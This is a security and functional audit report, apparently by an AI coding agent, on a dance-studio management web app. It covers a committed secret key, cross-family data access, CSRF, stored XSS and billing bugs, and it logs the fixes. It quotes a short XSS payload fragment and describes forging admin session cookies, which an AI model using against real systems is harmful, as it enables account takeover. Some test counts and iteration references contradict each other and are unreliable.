# AttenDANCE — Production-Readiness Assessment

**Audited:** 2026-07-05 · **Context:** Studio year over, recital done, summer session started, Jackrabbit canceled. This system is the fall plan of record. Client: LaShelle's School of Dance (LSO Dance).
**Method:** Static review of ~6.8k LOC (models, API, main, helpers, config, migrations, templates) + a live runtime harness (`tests/smoke_audit.py`) that boots the app, seeds two unrelated families, and probes access control + smoke-tests every no-arg route.

---

> **To actually launch:** follow [GO-LIVE.md](GO-LIVE.md) — the ordered runbook (required secrets → deploy → smoke test → optional client-side config).

## Verdict

**Production-ready for fall — pending two operator steps and one feature decision, all yours.** Every defect this audit found is fixed and verified; no known defects remain. The app is safe to onboard real families onto once you (1) `fly secrets set SECRET_KEY=…` and (2) change the seeded admin password — both in [GO-LIVE.md](GO-LIVE.md). The one substantive gap versus Jackrabbit is auto-pay (charging saved cards on a schedule); it's a feature that moves real money, needs your live Square account, and is scoped in [AUTOPAY-SCOPE.md](AUTOPAY-SCOPE.md) — not a defect blocking launch.

**Where it started:** the first pass found **2 P0s that were individually catastrophic** for a system holding minors' PII and money — any logged-in parent could read every other family's child records and the entire studio ledger (broken access control), and anyone with the repo could forge an admin login (the `SECRET_KEY` was committed). Plus a fatal parent-portal JS bug (the whole portal's JavaScript was dead from a bad string escape), three auth-lifecycle P1s, and a list of parity and polish gaps.

**Where it landed (105 commits on `fix/api-authorization-and-secret-key`):** both P0s fixed with a default-deny authorization model over the whole API; the fail-closed prod `SECRET_KEY` guard + session/remember cookie hardening; the parent portal repaired and **browser-verified**; auth lifecycle hardened (username-or-email login, sibling-merge onboarding, password reset, deactivation enforcement); the **teacher↔admin boundary** enforced (a teacher could read the revenue + aging reports — fixed); A/R aging + revenue reports, CSV exports, and a **full-database backup** added; server timezone pinned to Eastern **and every displayed timestamp fixed** (naive-UTC datetimes were rendering ~4–5h off); the whole **orphan-row / dead-page bug class closed** (9+ endpoints created orphans that 500'd a roster; both the create side and every serializer are now guarded); the two **automated engines hardened** (recurring charges: rejected a negative auto-recurring amount + can't brick boot; reminders: can't spam on re-run); **double-click idempotency** verified across every create/convert (lead-convert made duplicate families — fixed); the public registration endpoint made crash-proof + XSS-safe; and the UI fully polished (0 legacy files, 0 browser prompts, 0 browser alerts, one unified toast). Guarded by **334 automated checks** (`tests/smoke_audit.py` 312/312, `tests/test_billing.py` 22/22) wired into CI — parent + teacher authorization sweeps, malformed-input fuzz over every write endpoint, orphan-render guards, a prod security-config check, an empty-studio day-one sweep, and money-flow correctness (transactions, plans, recurring, late fees, statements).

**Further hardening (deep-audit passes after the initial landing):** with the P0s and parity gaps closed, later passes went after whole *classes* of latent defect and closed each with regression guards: the **entire injection surface** (CSV/formula, email-header, open-redirect, two admin-set payment-config XSS vectors, recital-image mimetype); **four real concurrency races** — a double-click or two tabs could **double-credit a payment**, create a **duplicate family** on registration approve, make a **duplicate attendance row**, or **double-charge bulk late fees** — all now atomic (conditional-claim / functional unique index / process lock), with the rest proven constraint-safe; **client-side double-submit** guards on every money-entry form; a **silent list-cap class** — the payments list and, worse, the **student roster + every student picker** (enrollment, check-in) only loaded the first 100, hiding students/transactions past 100 — fixed with pagination + a full-roster fetch; the **dead topbar search box** rebuilt into a real staff-only search; an **accessibility** fix (nameless auth fields); and RFID session-recovery. Guarded by **334 automated checks** (`tests/smoke_audit.py` 312/312, `tests/test_billing.py` 22/22) in CI.

Severity counts — original pass: **2 P0, 3 P1, 5 P2, 3 P3.** Now: **all resolved.** Every subsequent iteration's finding is also fixed and guarded. Nothing code-side blocks launch.

## What remains (all yours — not code)

1. **Ops (5 min, required):** `fly secrets set SECRET_KEY=…` and change the seeded `admin` password. See [GO-LIVE.md](GO-LIVE.md).
2. **Decision — teacher billing access:** `create_transaction` / `bulk_charge` / `create_recurring_charge` currently let a *teacher* (not just admin) post charges and set up billing (the nav shows them the Payments page). If only you + Carollette handle money, say so and I'll gate the whole billing area admin-only; if front-desk teachers take payments, it's already correct.
3. **Decision — auto-pay:** the one substantive Jackrabbit gap (auto-charging saved cards). Moves real money, needs your live Square account. Scoped in [AUTOPAY-SCOPE.md](AUTOPAY-SCOPE.md). Fall can run without it (manual Zelle/Cash App reconciliation + the aging report); greenlight when you want it built.
4. **Optional client config (in the UI, as time allows):** SMTP for auto-send, Square creds, Twilio SMS, Zelle QR — all in `/settings`, all non-blocking.
5. **Decision — getting the roster off Jackrabbit.** Existing families/students have to move into this system for fall. **Public self-registration is built** (flip `registration_open`, send families the `/register` link) and is the assumed path — it's clean but requires each family to act and doesn't carry over historical balances. A **one-shot bulk CSV importer is not built**; whether it's worth building depends on Jackrabbit's export format and whether you'd rather self-register than import (and whether any prior-balance carryover matters). Not built unilaterally — say the word with a sample Jackrabbit export and it's a scoped add.

---

## P0 — Blockers (must fix before any real user gets an account)

### [P0-1] Production SECRET_KEY is a committed, known placeholder → full auth bypass + secret decryption
- **Where:** `fly.toml:9` — `SECRET_KEY = 'fly-demo-key-change-for-real-prod'`, plus the fallback `'dev-secret-key-change-in-production-12345'` in `config/config.py:15`.
- **Why it's catastrophic:** Flask signs session cookies with `SECRET_KEY`. It's set as a **plaintext `[env]` value in a committed file** (not a Fly *secret*), so its value is in git history on a named GitHub repo. Anyone with the value can mint a cookie for `is_admin=True` and log in as admin — no password needed. Worse, `app/crypto.py` derives its Fernet key from `SECRET_KEY`, so the "encrypted at rest" Square access token is decryptable by anyone with the repo. The encryption is theater.
- **Fix (this iteration):** Remove the key from `fly.toml`; make `ProductionConfig` refuse to boot if `SECRET_KEY` is unset or matches a known weak/default value (fail closed). Then Thomas runs `fly secrets set SECRET_KEY=$(python3 -c 'import secrets;print(secrets.token_hex(32))')`. Safe to rotate now — Square isn't configured yet, so no encrypted secret gets orphaned.

### [P0-2] Broken access control (IDOR) on the core student/family/transaction API
- **Where:** `app/api/routes.py` — `GET/PUT/DELETE /api/students/<id>` (144–209), `GET /api/students/<id>/ledger` (695), `GET /api/families/<id>/ledger` (1214), `GET /api/students` (roster), `GET /api/transactions` (all money). All carry only `@login_required`; no staff or ownership check.
- **Proven live** (`tests/smoke_audit.py`, parent A vs parent B's child):
  - `GET /api/students/2` → **200** (reads another child's allergies/special-needs/emergency contact)
  - `DELETE /api/students/2` → **200** (deactivates another family's child)
  - `GET /api/students/2/ledger`, `GET /api/families/2/ledger` → **200** (another family's finances)
  - `GET /api/students`, `GET /api/transactions` → **200** (whole-studio roster + all transactions)
- **Note:** Newer endpoints (skills/waivers/payment-plan) *do* gate with `_parent_student_ids()` and return 403 — the pattern exists; the original CRUD predates it. This is a consistency fix, not new design.
- **Fix (this iteration):** Add `_staff_only()` + `_require_student_access()` / `_require_family_access()` helpers and apply to every legacy endpoint. Mutations (create/update/delete/assign-rfid) → staff only. Reads of a specific student/family → staff or linked parent. List endpoints → staff only.

---

## P1 — Serious (fix before relying on the feature)

### [P1-4] The ENTIRE parent portal's JavaScript was broken by an escaping bug — ✅ FIXED
- **Where:** `parent/dashboard.html` — a Zelle help string was written `...bank\\'s Zelle...` (double backslash). In a single-quoted JS string `\\` is a literal backslash, so the `'` **closed the string early**, producing a `SyntaxError` that killed the whole `{% block extra_js %}` script.
- **Impact (severe):** *nothing* dynamic on the parent dashboard ran — no payment methods, no "I paid" reporting, no makeup requests, no company/recital/costume/ticket sections, no forms badges. Parents saw a static shell. Confirmed live: before the fix, **zero** `/api/*` calls reached the server on `/parent`; after, all 8 `init()` fetches fire.
- **Why the earlier harness missed it:** the template verification harness Jinja-compiles and renders templates — it can't catch a *JavaScript runtime* syntax error. Only running the page in a real browser surfaced it. (Lesson logged: the smoke harness should node-check rendered inline scripts.)
- **Fix:** `\\'` → `\'`. Verified: `node --check` clean, and both rebuilt modals POST successfully end-to-end.

### [P1-1] Square invoice OVERCHARGES families who have paid down their balance ✅ FIXED
- **Where:** `app/api/routes.py` (`send_student_invoice`). Line items were built from **all charges ever** (ignoring payments). Critically, `square_service.send_invoice`'s own docstring says *"amount_cents … unused directly — line items drive it"* — so Square's order total is the **sum of line items = gross charges**, and the `amount_cents` (balance) was ignored entirely. A student with $200 charged / $150 paid was invoiced **$200**, not $50. Confirmed overcharge, not just a display bug.
- **Fix applied:** line items now carry a single "Outstanding balance" line equal to the net balance, so the Square total == the amount owed. Endpoint also gated staff-only.

### [P1-2] No autopay / cards-on-file — the core Jackrabbit billing feature is absent (parity)
- **Evidence:** grep for autopay/card-on-file/subscription → **0 hits**. Recurring billing only creates *charge* ledger rows; actual collection is manual reconciliation ("I paid via Zelle/CashApp") or a one-off Square invoice a parent must click. Jackrabbit's headline is auto-charging saved cards on a schedule.
- **Operational impact:** The studio *can* run fall on manual reconciliation (many small studios do), so this is not a hard blocker — but chasing unpaid tuition by hand is the biggest day-to-day tax vs Jackrabbit. Rank as the top post-launch build.
- **📋 Decision-ready scope:** see [AUTOPAY-SCOPE.md](AUTOPAY-SCOPE.md) — how it works with Square (Cards API + Web Payments SDK), the ~3–4 day phased build, PCI/security posture, risks, and the recommendation (**launch fall on manual; build auto-pay as the first post-launch project**). The plumbing is largely in place already (Square customer helper + the idempotent recurring scheduler).

### [P1-3] CSRF protection was disabled app-wide — ✅ FIXED (Origin check)
- **Was:** No `CSRFProtect`; 157 raw `fetch()` POSTs + HTML forms with only `SameSite=Lax` as mitigation.
- **Fix applied:** an app-wide `before_request` (`_csrf_origin_guard`) rejects any POST/PUT/DELETE/PATCH whose `Origin` (or `Referer`) host differs from the request host — the pattern many JSON APIs use. Browsers always send `Origin` on cross-site state-changing requests, so this blocks classic CSRF with **zero changes to the 157 fetch calls** and no new dependency; the HMAC-verified webhook and token-verified cron endpoint are exempt. Verified: cross-origin write → 403, same-origin/no-Origin → pass. Combined with `SameSite=Lax` this is a solid production posture. (Token-based Flask-WTF remains an option for belt-and-suspenders, but would require patching all 157 fetches.)

---

### [P1-5] Invited parents were locked out after logging out — ✅ FIXED
- **Where:** login was **username-only** (`User.query.filter_by(username=...)`), but the invite flow gives each parent an auto-generated username `parent-<invitecode>` (`api/routes.py`) that they're **never shown**, and they register with email + password. So a parent could register (auto-logged-in), use the portal, log out — and never get back in: they don't know their `parent-A1B2C3D4` username, and login didn't accept email.
- **Impact:** every invited family locked out of the parent portal after their first session → support tickets during fall enrollment.
- **Fix:** login now accepts **username OR email** (email is `unique`, so unambiguous); staff username login unchanged. Login form label/placeholder updated to "Username or email." Verified: email login → 302, username → 302, unknown email → rejected. Regression-guarded.

### [P1-6] Sibling families couldn't onboard both kids (500 + split accounts) — ✅ FIXED
- **Where:** `auth/routes.py` `register_parent`. The invite flow creates **one parent User per student**, so a family with 2+ dancers gets 2+ invite codes. Registering the 2nd invite with the same email set `invite_user.email = email` and committed with **no uniqueness check** → uncaught `IntegrityError` (email is `unique`) → **500**. Even with different emails, each child landed on a **separate account** — so no single login showed all a family's dancers (a core Jackrabbit behavior).
- **Fix:** when the register email already belongs to an active parent, **merge** — move the invited dancer's link onto that existing account (bulk-update to avoid cascade-nulling the FK), delete the redundant invite account, and send the parent to log in. Verified end-to-end: 2nd sibling invite merges (no 500), one account shows both kids, no orphaned invites, email login works after. Regression-guarded (4 checks). A non-parent email collision returns a friendly error.

### [P1-7] No password recovery — the "Forgot password?" link was dead — ✅ FIXED
- **Where:** the login page's "Forgot your password?" linked to `href="#"` (dead), there was no reset route (only `change_password`, which needs you already logged in), and admins can reset only *staff* passwords. So a parent who forgot their password in fall had **no recovery path** — a guaranteed support problem during enrollment.
- **Fix:** built a self-service reset — `GET/POST /auth/forgot-password` (request) + `GET/POST /auth/reset-password/<token>` — using stateless **itsdangerous** signed, 1-hour tokens (no new DB model) and the existing email service. Emails a reset link when SMTP is configured; otherwise shows a "contact the studio" message (graceful degradation), and always returns a generic response so emails can't be enumerated. Fixed the login link. Verified end-to-end (token round-trip resets the password, new password works, old password stops working, bad/expired tokens redirect). Regression-guarded (7 checks).

## P2 — Should fix

- **[P2-9] Stored XSS: two staff/admin views rendered user names unescaped — ✅ FIXED.** A systematic sweep of `innerHTML` interpolations found two spots that injected user-controlled names without `esc()`: the **A/R aging report** (`student_name`/`family_name`) and the **time-clock payroll report** (staff `name`). Student names come from **public self-registration**, so a dancer registered as `<img src=x onerror=…>` would execute in the admin's session when they open the aging report — stored XSS from an untrusted source into an admin context. Both now `esc()` the fields. Added a static regression guard (`run_xss_guard`) that fails if any known user-name field is interpolated without escaping. (Every other view already escaped; the `confirm()` dialogs that also show names are safe — they render text, not HTML.)

- **[P2-8] Server ran UTC → evening attendance/payments attributed to the next day — ✅ FIXED.** The `TIMEZONE='America/New_York'` config was **never used** (0 references), the code uses naive `date.today()` (35×) / `datetime.now()`, and no `TZ` was set in the container — so Fly ran **UTC**. For this Eastern studio with evening classes, an 8pm+ ET class's attendance and late-evening payments were dated the **next calendar day** (proven: a 9:30pm EDT moment on the 5th → `date.today()` = the 6th), and the take-attendance "today's classes" list flipped to tomorrow late in the evening. **Fix:** install `tzdata` and set `TZ=America/New_York` in the Dockerfile, so business dates (`date.today()`/`datetime.now()`) are local while `utcnow()` stays UTC for system/audit timestamps. Mechanism verified (UTC→wrong day, Eastern→correct). Keep the Dockerfile `TZ` in sync with config `TIMEZONE`.


- **[P2-1] Recurring charges silently skip short months — ✅ FIXED.** `_process_recurring_charges` skipped a charge when `today.day < day_of_month`, so a charge set for the 29th–31st never fired in Feb (and 31 never fired in any 30-day month) → missed tuition 1–5 months/yr with no error. Now clamps the due day to the month's last day (`min(day_of_month, monthrange)`), so it fires on the last day of short months. Math verified (Feb + day-31 → fires day 28). A date-frozen regression test needs `freezegun` (not yet a dep — see P3-3).
- **[P2-2] Raw `prompt()` data-entry flows → modals — ✅ DONE app-wide (0 prompts remain).**  _(history:_ — parent + leads + company + pending-payments DONE; ~30 remain.** Converted to real modals and verified live: parent-facing (donate, makeup), leads add, all three Performance Company flows, and the **whole pending-payments page** (apply-late-fees, new-payment-plan, reject-payment) — the payment-plan flow was 5 chained prompts including a *type-a-number* student picker, now a dropdown showing balances. Pending-payments is a fall-critical page, so clearing it fully matters. Remaining `prompt()` calls are in recital (off-season), donations-admin, waivers, skills, makeups — lower priority. `confirm()` guards on deletes are fine to keep.
- **[P2-3] Toast/feedback unification — ✅ DONE.** Added ONE global `toast(msg, ok)` in `base.html` available to every page; converted all 43 raw browser `alert()`s (staff CRUD pages) to it (only a deliberate copyable-invoice-URL alert kept). Pages with their own `toast()`/`msg()` keep theirs. Verified live — a styled bottom-center toast replaces the native alert. The app is now free of both browser prompts and browser alerts.
- **[P2-4] `aria-label`s — ✅ DONE app-wide.** Base shell (done earlier) plus a sweep of every icon-only button across the templates (delete/edit/close/remove/move/copy — ~23 buttons in 12 files) now have accessible names + `aria-hidden` on the decorative icons. 0 unlabeled icon-only buttons remain. (Caught and fixed 2 buttons a batch script mislabeled — the Donate and Save buttons had visible text and briefly got a wrong "Close" label; both corrected.)
- **[P2-5] `/api/cron/run` token compare — ✅ FIXED.** The `not token` guard already rejected an unset token (no empty-string bypass), but the comparison used `!=`. Switched to `secrets.compare_digest` (constant-time) to avoid leaking the token via response timing. Verified: no/wrong token → 403, correct → 200.

- **[P2-6] Login page displayed working admin credentials — ✅ FIXED.** `auth/login.html` showed a "Demo Credentials: admin / admin123" block with one-click "Use" buttons — handed anyone the default admin login. Now gated behind `{% if config.DEBUG %}` (shown in dev, hidden in production). Verified: dev renders it, `DEBUG=False` doesn't. **Still recommended:** change the seeded admin password from `admin123` for production.

- **[P2-7] Financial writes accepted unchecked amounts — ✅ FIXED.** `create_transaction` and `bulk_charge` (staff-only) passed `data['amount']` straight to the DB with no validation, so a typo could post a **negative** charge/payment (which silently corrupts a balance — a −$50 charge reads as a credit) or a non-numeric value (→ 500), and `bulk_charge` applied it to *every* enrolled student; `type` wasn't constrained to charge/payment, and a bad `transaction_date` 500'd. Now both use shared `_valid_amount` (numeric, >0, sane ceiling) + `_parse_txn_date` + a type whitelist. Verified (negative/non-numeric/absurd/bad-type all 400; valid charge 201). The untrusted parent paths (`claim_payment`, `create_donation`) were already validated.

## P3 — Polish

- **[P3-1] 2 `<img>` tags lacked `alt` — ✅ FIXED** (Zelle QR preview + recital ad; 0 remain).
- **[P3-2] `SECRET_KEY`/`JWT_SECRET_KEY` still have insecure dev fallbacks** in base `Config` — fine for dev, but the prod guard (P0-1) is what makes them safe.
- **[P3-3] Automated tests — ✅ IN CI.** `tests/smoke_audit.py` (57) + `tests/test_billing.py` (16) now run on every push/PR via `.github/workflows/tests.yml`, using the same `requirements-deploy.txt` set prod runs. Verified in a clean CI-mirror venv (57/57 + 16/16). The safety net is now durable — future changes can't silently regress access control, billing math, or the fall-critical flows.
- **[P3-4] CDN scripts load without Subresource Integrity.** `base.html` + report pages pull Tailwind, Alpine, Chart.js, FontAwesome from CDNs without `integrity`/`crossorigin` — a CDN compromise could inject script. Low likelihood (reputable CDNs) but cheap to harden: pin versions + add SRI hashes app-wide (do it consistently, not per-tag).

---

## Waiver signing (enrollment flow) — verified end-to-end

New families sign waivers at enrollment, so the positive path was verified (not just the IDOR block):
- A parent signs their **own** child's waiver (`POST .../waivers/<tid>/sign` → 200) and it reads back as `signed: true`.
- A typed signature is required (empty → 400); an idempotent re-sign updates the existing signature.
- **Decline rules hold:** declining a mandatory form → 400 ("requires agreement"); declining an opt-out form (e.g. photo release, `allow_decline`) → 200. Still blocks signing another family's child (403). Regression-guarded.

## Taking attendance (most-used fall feature) — verified live

The single most-used daily flow was exercised end-to-end and works:
- The card-based take-attendance UI (`/take-attendance/<class_id>`) renders per-student week grids with the current week highlighted.
- Marking present persists (`POST /api/attendance/toggle` → 201, `present: true`); tapping again removes it (→ 200, `present: false`) — correct idempotent toggle.
- Parents can't mark attendance (write-guard, 403). Regression-guarded in the harness.

## Email/SMS message blasts (studio→families comms) — audited & verified

The fall communication path was reviewed and comes back **sound**:
- Recipient resolution for `all` / `class` / `individual` is correct and de-duplicated (a `set`), uses a join to avoid N+1, and prefers parent email over student email.
- **Graceful degradation:** when SMTP isn't configured (current prod state), the blast is *saved* and the resolved emails are returned for manual copy; an SMTP send failure saves the message and returns the recipients too — nothing is silently lost.
- Parents can't send (write-guard, 403). Hardened this pass: a non-numeric `recipient_filter` now returns 400 instead of 500.
- Verified in the harness (blast to `all` resolves 2 recipients + degrades gracefully; missing subject → 400; bad class filter → 400; parent → 403).

## Public self-registration (fall-enrollment path) — audited & verified

The most-load-bearing untrusted flow for fall was reviewed end-to-end and comes back **sound**:
- **Submit** (`POST /api/register`, public): gated by `registration_open`, requires parent name/email + ≥1 dancer, stores the payload as JSON. Hardened this pass: added email-format validation.
- **No stored XSS:** the admin `/registrations` page escapes *every* attacker-controlled field (`parent_name`, email, phone, note, student names/allergies) via `esc()`.
- **Approve** (`admin`): creates Family + Students + enrollments using only whitelisted fields (**no mass assignment** — a crafted `is_admin`/etc. is ignored), idempotent (`status != 'pending'` guard). Hardened this pass: enrollments now filter to **existing** class IDs so a class deleted between submit and approval can't create a dangling enrollment that 500s the roster later.
- **Verified end-to-end** in the harness (closed→403, bad email→400, no dancers→400, valid→201, queued, approve creates 1 family + 2 students, re-approve→400) and in the browser (both the closed-state page and the live enrollment form render on-brand).

## Functional / reliability sweep — comes back clean

**Client-side runtime layer — fully swept (iteration 6), clean after the P1-4 fix:**
- **All rendered inline JS node-checked:** 84 pages, 56 inline scripts parsed via `node --check` (as admin) — 0 syntax errors. The parent dashboard (P1-4) was the only broken page; every staff page is clean.
- **All fetch endpoints exist:** 147 `fetch('/api/...')` calls across the templates cross-checked against the registered route map — 0 dead endpoints (the only "unmatched" were string-concatenation prefixes whose real routes exist).
- **Browser runtime sweep:** loaded 13 JS-heavy staff pages (transactions, pending, recital-hub, company, analytics, calendar, waivers, skills, leads, makeups, timeclock, settings, dashboard) + the parent portal in a real browser — **zero console errors, zero failed API requests**.

**Deletion / cascade integrity — audited (all 30 DELETE endpoints), sound:**
- SQLite FK enforcement is off (no `PRAGMA foreign_keys=ON`), so orphaned rows are *possible* in principle — but the app avoids them by design: **containers soft-delete** (student, location, performance group, costume, skill → `is_active=False`), and **family/class have no delete endpoint at all**, so students/enrollments can't be orphaned by removing a parent.
- The one hard-delete with dependents (`delete_ticket_type`) explicitly removes its `TicketOrder`s first — verified empirically (deleting a type with a live order leaves 0 orphaned orders).
- Net: no cascade/orphan bug. (Flipping on FK enforcement is *not* recommended without adding `ON DELETE` rules first — the current manual-cleanup pattern assumes it's off, so enabling it would make existing hard-deletes error.)

Server-side areas most likely to hide bugs; no new P0/P1 beyond what's already fixed:
- **Migrations are idempotent** (`app/migrations.py`): every `ALTER TABLE` is guarded by a column-existence check and is additive-only; `db.create_all()` handles new tables before migrations run. Fresh DB and existing prod DB both boot.
- **Silent failures:** the `except Exception:` blocks log via `logger.exception`; the one `except: pass` (`email.py`) is on `smtp.quit()` in a `finally` — harmless, real send errors propagate.
- **No meaningful N+1 / memory risk at this scale:** singular `calc_balance` calls are all single-student contexts (invoice, reminder, one parent's few children); bulk paths use `calc_balance_bulk` (one aggregate query); unbounded `.all()` only hits the students table (hundreds of rows) — fine on the 256MB box. The 1-worker gthread posture is deliberate and documented.
- **Startup side effects** (recurring charges, reminders) are wrapped/guarded; recurring is now short-month-safe.

## Jackrabbit parity — capability matrix

Verdict: **strong parity for daily operations; the one structural gap is automated payment collection.** A studio can run the fall session on this today (registration, scheduling, attendance, tuition charges, parent portal, recital, comms all work), but tuition *collection* is manual — the biggest ongoing difference from Jackrabbit.

| Capability | Status | Notes |
|---|---|---|
| Online registration & enrollment | **PRESENT** | Public `/register` → Registration → admin approve; class waitlists |
| Family & student management | **PRESENT** | Family/siblings, full student records + measurements |
| Class scheduling (day/time/level/age) | **PRESENT** | `DanceClass` + visual `/calendar` |
| Attendance & absences | **PRESENT** | Attendance + RFID + makeups |
| Tuition charges & recurring billing | **PRESENT** | Recurring charge rows, per-category balances, bulk charge |
| **Auto-pay / cards on file** | **MISSING** | No saved-card auto-charge — the #1 gap (P1-2) |
| Online card payment | **PARTIAL** | One-off Square invoices (manual send); no integrated checkout/autopay |
| Payment reconciliation | **PRESENT** | Parent "I paid" → admin confirm inbox; family-split allocation |
| Parent portal | **PRESENT** | View account/schedule, report payments, waivers, tickets, makeups, donate |
| Skills / levels | **PRESENT** | Skill/StudentSkill + printable certificates |
| Costume & recital management | **PRESENT** | Recital Hub: numbers/cast/costumes/tickets/awards/ads/booklet |
| Email / SMS communication | **PRESENT*** | Blasts + Twilio SMS — *needs SMTP/Twilio creds entered to actually send |
| Late / returned-payment fees | **PARTIAL** | Late fees ✅ (now idempotent); no NSF/returned-payment or refund/void path |
| Financial statements | **PRESENT** | Year-end student/family + 501(c)(3) giving statements |
| Waivers & policies | **PRESENT** | Digital waivers + per-rule acknowledgment |
| Staff/teacher roles | **PARTIAL** | admin vs teacher tiers exist, but coarse — a teacher sees all students, not just their classes |
| Management reporting (revenue/enrollment/AR aging/export) | **PRESENT** (was PARTIAL) | ✅ Revenue report (`/reports/revenue`: billed-vs-collected by month + by category + totals) · ✅ AR aging (`/reports/aging`) · ✅ CSV export (roster + transactions) · retention/enrollment analytics · ticket revenue. Remaining nice-to-have: enrollment/capacity summary + CSV of the aging report |

**Top parity risks for fall, ranked:** (1) auto-pay/cards-on-file — manual collection is the daily tax; (2) AR aging report — the owner will want a "who owes, how overdue" view to chase tuition; (3) confirm SMTP/Twilio are configured so receipts/reminders actually send (currently save-only).

---

## What's genuinely solid (don't re-litigate)

- **UI redesign is fully landed** — 0 files hit the legacy-style grep (`gray-*`, `indigo-`, old hex, `bg-white shadow`). The purple/gold token system is applied consistently.
- **80/80 no-arg admin GET routes return < 500** in the smoke run — no broken staff pages at that level.
- **Newer endpoints already enforce ownership** (`_parent_student_ids`), so the team knows the pattern.
- **App boots clean**, 238 routes, single-worker memory posture is deliberate and documented.

---

## Fix log (updated each iteration)

### Iteration 1 — DONE (verified by `tests/smoke_audit.py`, 24/24 pass)
- **P0-2 broken access control — FIXED & VERIFIED.** Added `_staff_only` / `_require_student_access` / `_require_family_access` helpers and a fail-closed `@bp.before_request` that default-denies parents on every mutating method except a 7-endpoint allowlist. Applied ownership/staff guards to the leaking CRUD, ledgers, balances, roster, transactions, families, messages, attendance, dashboard-stats, rfid, recurring-charges, class-enrollments, rules-status, and rule-acknowledge. Harness proves: parent can no longer read other families' data, pull the roster, fabricate a payment, or fire an email blast — and parent-allowed writes (claim/donate) still work.
- **P0-1 committed prod SECRET_KEY — FIXED.** Removed the key from `fly.toml`; production now **refuses to boot** on a missing/known-default key (`app/__init__.py`). Verified: refuses weak/absent, boots on a strong key, dev unaffected.
  - ⚠️ **REQUIRED before next deploy (Thomas):** `fly secrets set SECRET_KEY=$(python3 -c 'import secrets;print(secrets.token_hex(32))')` — otherwise prod won't start (by design). Safe to rotate now: Square isn't configured, so no encrypted secret is orphaned.
- **P1-1 Square overcharge — FIXED.** Invoice line items now sum to the net balance.
- Added `tests/smoke_audit.py` (boot + IDOR + write-guard + no-arg smoke) as the regression seed.

### Iteration 2 — DONE (verified by `tests/test_billing.py`, 11/11 pass)
- **Late-fee double-application — FIXED.** `apply_late_fees` had no idempotency guard; an admin double-click / refresh-repost applied a *second* late fee to every over-threshold family. Now skips any student already charged a late fee this calendar month (matches the recurring-charge guard). Verified: second run charges 0, each student ends with exactly one fee.
- **Billing correctness verified (no change needed):** `allocate_family_payment` loses/invents no pennies across exact/partial/overpayment/odd-cent inputs and caps each child at their balance (money is `Numeric(10,2)` at rest; the `float()` casts in helpers are a smell but safe given 2-decimal values). `confirm_pending_payment` blocks re-confirm (`status != 'pending'`). Square webhook is idempotent (`if rec.paid_at`) and HMAC-verified when keyed.
- **P2 logged (now FIXED in iter 40):** Square webhook recorded the *full* invoice amount on a `PARTIALLY_PAID` event and set `paid_at`, so the later `PAID` event was ignored — over-counted the payment and dropped the remainder.

### Iteration 3 — DONE
- **Functional/reliability sweep** (migrations idempotency, silent failures, N+1/memory) — clean, no new bugs (see section above).
- **Jackrabbit parity matrix** produced (see section above) — verdict: strong daily-ops parity, auto-pay is the one structural gap.
- **Accessibility:** base-shell icon buttons + search input labelled (`aria-label`/`aria-hidden`); both missing `<img alt>` fixed. All 46 templates still Jinja-compile.

### Iteration 4 — DONE (verified live in preview + `tests/test_billing.py` 16/16)
- **A/R aging report built** (`GET /api/reports/aging` staff-only + `/reports/aging` admin page + nav link): FIFO payment application, 0-30/31-60/61-90/90+ buckets, per-student rows + totals, empty state, overdue buckets flagged red. Closes parity gap #2. FIFO math unit-tested (boundaries, partial payment, overpayment credit) and verified end-to-end in the live preview ($120@95d + $80@40d + $60@5d − $100 payment → 90+=$20, 31-60=$80, current=$60, total=$160).
- **Found + fixed via preview:** login page exposed demo `admin/admin123` — now gated behind `config.DEBUG` (P2-6), hidden in production.
- `run.py` now honors `PORT` (12-factor) so it runs under any harness/PaaS.

### Iteration 5 — DONE (verified live in browser; smoke 32/32, billing 16/16)
- **P1-4 — found & fixed the parent portal's fatal JS escaping bug** (see P1-4). The whole parent dashboard was non-functional; now all sections load. **This was the most impactful find of the audit** and only surfaced by running the page in a real browser.
- **Parent-facing `prompt()` flows → real modals** (donate + makeup request), verified end-to-end (both POST 201 in the live preview) with on-brand styling and accessible close buttons.
- **Added a rendered-inline-JS `node --check` guard to the smoke harness** so a JS syntax error in any JS-heavy page fails CI instead of silently bricking a page.

### Iteration 6 — DONE (whole-app runtime verification)
- **Swept the entire client-side runtime** (see the Functional section): node-checked every rendered inline script (56 across 84 pages), cross-checked all 147 `fetch()` calls against the route map (0 dead endpoints), and browser-loaded 13 JS-heavy staff pages — **all clean, zero console errors, zero failed requests**. Confirms P1-4 was the only runtime break; the app's JS layer is now sound end-to-end.

### Iteration 7 — DONE (verified live; smoke 37/37)
- **CSV export built** (`/api/reports/students.csv` + `/api/reports/transactions.csv`, staff-only): roster export (contacts, DOB, emergency, allergies, balance) and transaction ledger export (optional `?start=&end=` range) with proper attachment headers. "Export CSV" buttons on the Students and Payments pages; an "Aging" shortcut added to Payments too. Closes the "get my data out" reporting gap Jackrabbit covers. Verified live — real roster CSV downloads with correct data; parents blocked (403).

### Iteration 8 — DONE (verified live; smoke 39/39)
- **Revenue report built** (`GET /api/reports/revenue` staff-only + `/reports/revenue` admin page + nav link): headline totals (collected this month/year/all-time, outstanding), a 12-month billed-vs-collected bar chart (Chart.js), and collected-by-category table. Verified live — tiles, chart, and category breakdown all render with real seeded data. **Management-reporting parity is now PRESENT** (revenue + aging + CSV export + retention analytics).

### Iteration 9 — DONE (smoke 45/45, billing 16/16)
- **Input validation on financial writes** (P2-7): `create_transaction` + `bulk_charge` now reject negative/non-numeric/absurd amounts, invalid `type`, and malformed dates via shared `_valid_amount`/`_parse_txn_date` helpers — closing a silent balance-corruption path. Audited the untrusted parent money paths (`claim_payment`, `create_donation`) — already validated. Added 6 validation regression checks.

### Iteration 10 — DONE (smoke 53/53)
- **Audited + verified the public self-registration flow** (the critical fall-enrollment path): confirmed no stored XSS (admin page escapes all fields), no mass assignment on approval, idempotent. Hardened: email-format validation on submit, and approval now filters to existing class IDs (prevents dangling enrollments that would 500 the roster). Added a full submit→queue→approve→create regression (7 checks).

### Iteration 11 — DONE (deletion/cascade integrity audit)
- **Audited all 30 DELETE endpoints + cascade behavior** (see the Deletion section): sound. Containers soft-delete; family/class aren't deletable; the one hard-delete-with-dependents cleans up first (verified empirically — 0 orphaned orders). No cascade/orphan bug despite SQLite FK enforcement being off. This clears the last major server-side risk area I hadn't checked.

### Iteration 12 — DONE (verified live)
- **Staff UX: leads add flow → modal.** The New Lead flow was 5 chained browser `prompt()` dialogs; replaced with one on-brand modal form (name required, email/phone/interest/source). Verified live end-to-end (POST 201, lead appears in list). node-checked clean.

